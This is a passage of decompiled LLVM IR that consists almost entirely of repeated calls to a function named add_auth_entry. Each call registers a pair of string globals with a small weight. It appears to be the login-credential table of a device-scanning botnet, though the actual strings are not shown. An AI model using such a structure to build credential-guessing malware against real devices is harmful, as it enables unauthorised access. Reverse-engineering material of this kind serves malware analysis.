  store i32 ptrtoint ([5 x i8]* @global_var_1b6e4.368 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b6e4.368 to i32), i32* %r1.global-to-local, align 4
  %v5_10200 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b6e4.368 to i32), i32 ptrtoint ([5 x i8]* @global_var_1b6e4.368 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_1b6ec.370 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b6f4.372 to i32), i32* %r1.global-to-local, align 4
  %v0_1020c = load i32, i32* @r4, align 4
  store i32 %v0_1020c, i32* %r2.global-to-local, align 4
  %v5_10210 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b6ec.370 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b6f4.372 to i32), i32 %v0_1020c)
  store i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b6f4.372 to i32), i32* %r1.global-to-local, align 4
  %v0_1021c = load i32, i32* @r4, align 4
  store i32 %v0_1021c, i32* %r2.global-to-local, align 4
  %v5_10220 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b6f4.372 to i32), i32 %v0_1021c)
  store i32 ptrtoint ([3 x i8]* @global_var_1b6c4.374 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b6fc.376 to i32), i32* %r1.global-to-local, align 4
  %v0_1022c = load i32, i32* @r4, align 4
  store i32 %v0_1022c, i32* %r2.global-to-local, align 4
  %v5_10230 = call i32 @add_auth_entry(i32 ptrtoint ([3 x i8]* @global_var_1b6c4.374 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b6fc.376 to i32), i32 %v0_1022c)
  store i32 ptrtoint ([7 x i8]* @global_var_1b6fc.376 to i32), i32* %r0.global-to-local, align 4
  %v0_10238 = load i32, i32* @r4, align 4
  store i32 %v0_10238, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b6fc.376 to i32), i32* %r1.global-to-local, align 4
  %v5_10240 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_1b6fc.376 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b6fc.376 to i32), i32 %v0_10238)
  store i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b704.378 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_10250 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32 ptrtoint (i32* @global_var_1b704.378 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b704.378 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_10260 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint (i32* @global_var_1b704.378 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b710.380 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v5_10270 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint ([5 x i8]* @global_var_1b710.380 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b718.382 to i32), i32* %r1.global-to-local, align 4
  %v0_1027c = load i32, i32* @r4, align 4
  store i32 %v0_1027c, i32* %r2.global-to-local, align 4
  %v5_10280 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b718.382 to i32), i32 %v0_1027c)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b720.384 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_10290 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint (i32* @global_var_1b720.384 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b72c.386 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_102a0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint (i32* @global_var_1b72c.386 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b734.388 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_102b0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint (i32* @global_var_1b734.388 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b740.390 to i32), i32* %r1.global-to-local, align 4
  %v0_102bc = load i32, i32* @r4, align 4
  store i32 %v0_102bc, i32* %r2.global-to-local, align 4
  %v4_102c0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint (i32* @global_var_1b740.390 to i32), i32 %v0_102bc)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b748.392 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_102d0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint (i32* @global_var_1b748.392 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b754.394 to i32), i32* %r1.global-to-local, align 4
  %v0_102dc = load i32, i32* @r4, align 4
  store i32 %v0_102dc, i32* %r2.global-to-local, align 4
  %v4_102e0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint (i32* @global_var_1b754.394 to i32), i32 %v0_102dc)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b75c.396 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_102f0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint (i32* @global_var_1b75c.396 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b764.398 to i32), i32* %r1.global-to-local, align 4
  %v0_102fc = load i32, i32* @r4, align 4
  store i32 %v0_102fc, i32* %r2.global-to-local, align 4
  %v5_10300 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b764.398 to i32), i32 %v0_102fc)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b76c.400 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_10310 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint (i32* @global_var_1b76c.400 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b774.402 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_10320 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint (i32* @global_var_1b774.402 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1b780.404 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_10330 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint ([9 x i8]* @global_var_1b780.404 to i32), i32 8)
  store i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1b78c.406 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_10340 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32 ptrtoint ([6 x i8]* @global_var_1b78c.406 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_1b78c.406 to i32), i32* %r0.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1b78c.406 to i32), i32* %r1.global-to-local, align 4
  %v5_10350 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b78c.406 to i32), i32 ptrtoint ([6 x i8]* @global_var_1b78c.406 to i32), i32 5)
  store i32 ptrtoint ([8 x i8]* @global_var_1b794.408 to i32), i32* %r0.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1b794.408 to i32), i32* %r1.global-to-local, align 4
  %v5_10360 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1b794.408 to i32), i32 ptrtoint ([8 x i8]* @global_var_1b794.408 to i32), i32 7)
  store i32 ptrtoint (i32* @global_var_1b79c.410 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b4b8.240 to i32), i32* %r1.global-to-local, align 4
  %v0_1036c = load i32, i32* @r4, align 4
  store i32 %v0_1036c, i32* %r2.global-to-local, align 4
  %v4_10370 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_1b79c.410 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b4b8.240 to i32), i32 %v0_1036c)
  store i32 ptrtoint ([4 x i8]* @global_var_1b7a4.412 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1b450.216 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_10380 = call i32 @add_auth_entry(i32 ptrtoint ([4 x i8]* @global_var_1b7a4.412 to i32), i32 ptrtoint ([9 x i8]* @global_var_1b450.216 to i32), i32 8)
  store i32 ptrtoint ([7 x i8]* @global_var_1b7a8.414 to i32), i32* %r0.global-to-local, align 4
  %v0_10388 = load i32, i32* @r4, align 4
  store i32 %v0_10388, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b7a8.414 to i32), i32* %r1.global-to-local, align 4
  %v5_10390 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_1b7a8.414 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b7a8.414 to i32), i32 %v0_10388)
  store i32 ptrtoint ([6 x i8]* @global_var_1b7b0.416 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b7b8.418 to i32), i32* %r1.global-to-local, align 4
  %v0_1039c = load i32, i32* @r4, align 4
  store i32 %v0_1039c, i32* %r2.global-to-local, align 4
  %v4_103a0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b7b0.416 to i32), i32 ptrtoint (i32* @global_var_1b7b8.418 to i32), i32 %v0_1039c)
  store i32 ptrtoint ([7 x i8]* @global_var_1b7c0.420 to i32), i32* %r0.global-to-local, align 4
  %v0_103a8 = load i32, i32* @r4, align 4
  store i32 %v0_103a8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b7c0.420 to i32), i32* %r1.global-to-local, align 4
  %v5_103b0 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_1b7c0.420 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b7c0.420 to i32), i32 %v0_103a8)
  store i32 ptrtoint ([6 x i8]* @global_var_1b7c8.422 to i32), i32* %r0.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1b7c8.422 to i32), i32* %r1.global-to-local, align 4
  %v5_103c0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b7c8.422 to i32), i32 ptrtoint ([6 x i8]* @global_var_1b7c8.422 to i32), i32 5)
  store i32 ptrtoint ([8 x i8]* @global_var_1b7d0.424 to i32), i32* %r0.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1b7d0.424 to i32), i32* %r1.global-to-local, align 4
  %v5_103d0 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1b7d0.424 to i32), i32 ptrtoint ([8 x i8]* @global_var_1b7d0.424 to i32), i32 7)
  store i32 ptrtoint ([4 x i8]* @global_var_1b7d8.426 to i32), i32* %r0.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1b7d8.426 to i32), i32* %r1.global-to-local, align 4
  %v5_103e0 = call i32 @add_auth_entry(i32 ptrtoint ([4 x i8]* @global_var_1b7d8.426 to i32), i32 ptrtoint ([4 x i8]* @global_var_1b7d8.426 to i32), i32 3)
  store i32 ptrtoint ([4 x i8]* @global_var_1b7dc.428 to i32), i32* %r0.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1b7dc.428 to i32), i32* %r1.global-to-local, align 4
  %v5_103f0 = call i32 @add_auth_entry(i32 ptrtoint ([4 x i8]* @global_var_1b7dc.428 to i32), i32 ptrtoint ([4 x i8]* @global_var_1b7dc.428 to i32), i32 3)
  store i32 ptrtoint (i32* @global_var_1b7e0.430 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b7e0.430 to i32), i32* %r1.global-to-local, align 4
  %v3_10400 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_1b7e0.430 to i32), i32 ptrtoint (i32* @global_var_1b7e0.430 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_1b7e8.432 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b7e8.432 to i32), i32* %r1.global-to-local, align 4
  %v5_10410 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b7e8.432 to i32), i32 ptrtoint ([5 x i8]* @global_var_1b7e8.432 to i32), i32 4)
  store i32 ptrtoint ([7 x i8]* @global_var_1b7f0.434 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b3d4.190 to i32), i32* %r1.global-to-local, align 4
  %v0_1041c = load i32, i32* @r4, align 4
  store i32 %v0_1041c, i32* %r2.global-to-local, align 4
  %v4_10420 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_1b7f0.434 to i32), i32 ptrtoint (i32* @global_var_1b3d4.190 to i32), i32 %v0_1041c)
  store i32 ptrtoint ([6 x i8]* @global_var_1b7f8.436 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b5c8.226 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_10430 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b7f8.436 to i32), i32 ptrtoint (i32* @global_var_1b5c8.226 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_1b7f8.436 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b438.208 to i32), i32* %r1.global-to-local, align 4
  %v0_1043c = load i32, i32* @r4, align 4
  store i32 %v0_1043c, i32* %r2.global-to-local, align 4
  %v4_10440 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b7f8.436 to i32), i32 ptrtoint (i32* @global_var_1b438.208 to i32), i32 %v0_1043c)
  store i32 ptrtoint ([7 x i8]* @global_var_1b800.438 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b3d4.190 to i32), i32* %r1.global-to-local, align 4
  %v0_1044c = load i32, i32* @r4, align 4
  store i32 %v0_1044c, i32* %r2.global-to-local, align 4
  %v4_10450 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_1b800.438 to i32), i32 ptrtoint (i32* @global_var_1b3d4.190 to i32), i32 %v0_1044c)
  store i32 ptrtoint ([7 x i8]* @global_var_1b800.438 to i32), i32* %r0.global-to-local, align 4
  %v0_10458 = load i32, i32* @r4, align 4
  store i32 %v0_10458, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b800.438 to i32), i32* %r1.global-to-local, align 4
  %v5_10460 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_1b800.438 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b800.438 to i32), i32 %v0_10458)
  store i32 ptrtoint ([5 x i8]* @global_var_1b808.440 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b808.440 to i32), i32* %r1.global-to-local, align 4
  %v5_10470 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b808.440 to i32), i32 ptrtoint ([5 x i8]* @global_var_1b808.440 to i32), i32 4)
  store i32 ptrtoint ([6 x i8]* @global_var_1b810.442 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_10480 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b810.442 to i32), i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32 5)
  store i32 ptrtoint ([8 x i8]* @global_var_1b818.444 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_10490 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1b818.444 to i32), i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32 7)
  store i32 ptrtoint ([7 x i8]* @global_var_1b820.446 to i32), i32* %r0.global-to-local, align 4
  %v0_10498 = load i32, i32* @r4, align 4
  store i32 %v0_10498, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b820.446 to i32), i32* %r1.global-to-local, align 4
  %v5_104a0 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_1b820.446 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b820.446 to i32), i32 %v0_10498)
  store i32 ptrtoint ([6 x i8]* @global_var_1b828.448 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1b830.450 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_104b0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b828.448 to i32), i32 ptrtoint ([6 x i8]* @global_var_1b830.450 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_1b838.452 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b840.454 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_104c0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b838.452 to i32), i32 ptrtoint ([5 x i8]* @global_var_1b840.454 to i32), i32 5)
  store i32 ptrtoint (i32* @global_var_1b848.456 to i32), i32* %r0.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b848.456 to i32), i32* %r1.global-to-local, align 4
  %v3_104d0 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_1b848.456 to i32), i32 ptrtoint (i32* @global_var_1b848.456 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_1b5dc.458 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b850.460 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_104e0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b5dc.458 to i32), i32 ptrtoint (i32* @global_var_1b850.460 to i32), i32 8)
  store i32 ptrtoint ([7 x i8]* @global_var_1b85c.462 to i32), i32* %r0.global-to-local, align 4
  %v0_104e8 = load i32, i32* @r4, align 4
  store i32 %v0_104e8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b85c.462 to i32), i32* %r1.global-to-local, align 4
  %v5_104f0 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_1b85c.462 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b85c.462 to i32), i32 %v0_104e8)
  store i32 ptrtoint (i32* @global_var_1b864.464 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b86c.466 to i32), i32* %r1.global-to-local, align 4
  %v0_104fc = load i32, i32* @r4, align 4
  store i32 %v0_104fc, i32* %r2.global-to-local, align 4
  %v4_10500 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_1b864.464 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b86c.466 to i32), i32 %v0_104fc)
  store i32 ptrtoint (i32* @global_var_1b3d4.190 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1b874.468 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_10510 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_1b3d4.190 to i32), i32 ptrtoint ([9 x i8]* @global_var_1b874.468 to i32), i32 8)
  store i32 ptrtoint (i32* @global_var_1b3d4.190 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1b880.470 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_10520 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_1b3d4.190 to i32), i32 ptrtoint ([9 x i8]* @global_var_1b880.470 to i32), i32 8)
  %v0_10524 = load i32, i32* @r4, align 4
  store i32 %v0_10524, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b3d4.190 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b88c.472 to i32), i32* %r1.global-to-local, align 4
  %v4_10530 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_1b3d4.190 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b88c.472 to i32), i32 %v0_10524)
  store i32 ptrtoint (i32* @global_var_1b894.474 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b8a0.476 to i32), i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  %v4_10540 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_1b894.474 to i32), i32 ptrtoint ([5 x i8]* @global_var_1b8a0.476 to i32), i32 11)
  store i32 ptrtoint ([9 x i8]* @global_var_1b8a8.478 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1b8a8.478 to i32), i32* %r1.global-to-local, align 4
  %v5_10550 = call i32 @add_auth_entry(i32 ptrtoint ([9 x i8]* @global_var_1b8a8.478 to i32), i32 ptrtoint ([9 x i8]* @global_var_1b8a8.478 to i32), i32 8)
  store i32 ptrtoint ([9 x i8]* @global_var_1b8b4.480 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1b8b4.480 to i32), i32* %r1.global-to-local, align 4
  %v5_10560 = call i32 @add_auth_entry(i32 ptrtoint ([9 x i8]* @global_var_1b8b4.480 to i32), i32 ptrtoint ([9 x i8]* @global_var_1b8b4.480 to i32), i32 8)
  store i32 ptrtoint ([9 x i8]* @global_var_1b8c0.482 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1b8c0.482 to i32), i32* %r1.global-to-local, align 4
  %v5_10570 = call i32 @add_auth_entry(i32 ptrtoint ([9 x i8]* @global_var_1b8c0.482 to i32), i32 ptrtoint ([9 x i8]* @global_var_1b8c0.482 to i32), i32 8)
  store i32 ptrtoint (i32* @global_var_1b5c4.298 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b5c4.298 to i32), i32* %r1.global-to-local, align 4
  %v3_10580 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_1b5c4.298 to i32), i32 ptrtoint (i32* @global_var_1b5c4.298 to i32), i32 8)
  store i32 ptrtoint (i32* @global_var_1b8cc.484 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b8cc.484 to i32), i32* %r1.global-to-local, align 4
  %v3_10590 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_1b8cc.484 to i32), i32 ptrtoint (i32* @global_var_1b8cc.484 to i32), i32 8)
  store i32 ptrtoint ([9 x i8]* @global_var_1b8d8.486 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1b8d8.486 to i32), i32* %r1.global-to-local, align 4
  %v5_105a0 = call i32 @add_auth_entry(i32 ptrtoint ([9 x i8]* @global_var_1b8d8.486 to i32), i32 ptrtoint ([9 x i8]* @global_var_1b8d8.486 to i32), i32 8)
  store i32 ptrtoint ([9 x i8]* @global_var_1b8e4.488 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1b8e4.488 to i32), i32* %r1.global-to-local, align 4
  %v5_105b0 = call i32 @add_auth_entry(i32 ptrtoint ([9 x i8]* @global_var_1b8e4.488 to i32), i32 ptrtoint ([9 x i8]* @global_var_1b8e4.488 to i32), i32 8)
  store i32 ptrtoint ([8 x i8]* @global_var_1b8f0.490 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1b4c8.244 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v5_105c0 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1b8f0.490 to i32), i32 ptrtoint ([11 x i8]* @global_var_1b4c8.244 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b8f8.492 to i32), i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v4_105d0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint (i32* @global_var_1b8f8.492 to i32), i32 13)
  store i32 ptrtoint ([6 x i8]* @global_var_1b7b0.416 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b908.494 to i32), i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  %v4_105e0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b7b0.416 to i32), i32 ptrtoint (i32* @global_var_1b908.494 to i32), i32 14)
  store i32 ptrtoint ([10 x i8]* @global_var_1b918.496 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b924.498 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_105f0 = call i32 @add_auth_entry(i32 ptrtoint ([10 x i8]* @global_var_1b918.496 to i32), i32 ptrtoint (i32* @global_var_1b924.498 to i32), i32 10)
  store i32 ptrtoint ([10 x i8]* @global_var_1b930.500 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1b93c.502 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
